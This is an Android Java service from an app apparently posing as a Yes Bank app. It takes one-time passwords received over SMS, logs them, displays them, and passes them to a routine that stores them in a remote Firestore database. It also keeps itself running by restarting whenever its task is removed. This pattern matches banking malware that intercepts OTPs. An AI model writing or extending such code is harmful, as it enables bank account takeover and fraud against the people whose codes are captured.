package com.example.yesbankapp;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class OTPService extends Service {

    private static final String CHANNEL_ID = "OTP_SERVICE_CHANNEL";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String otp = intent.getStringExtra("otp");

        Log.d("OTPService", "Received OTP: " + otp);

        // Create a pending intent to launch your app when the notification is clicked
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_UPDATE_CURRENT);

        // Create a notification for the foreground service
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("OTP Service")
                .setContentText("Processing OTP: " + otp)
                .setSmallIcon(R.drawable.ic_launcher_foreground) // Use your app's icon
                .setContentIntent(pendingIntent)
                .build();

        // Start the service in the foreground
        startForeground(1, notification);

        // Perform background tasks (storing OTP data to Firestore)
        handleOTP(otp);

        return START_STICKY; // Restart the service if it's killed by the system
    }

    private void handleOTP(String otp) {
        // Store OTP in Firestore
        SmsReceiver smsReceiver = new SmsReceiver();
        smsReceiver.storeOTPInFirestore(otp); // Assuming the OTP storage method exists in SmsReceiver
    }

    // Create a notification channel for Android 8.0 and higher
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "OTP Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), OTPService.class);
        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // No binding needed
    }
}
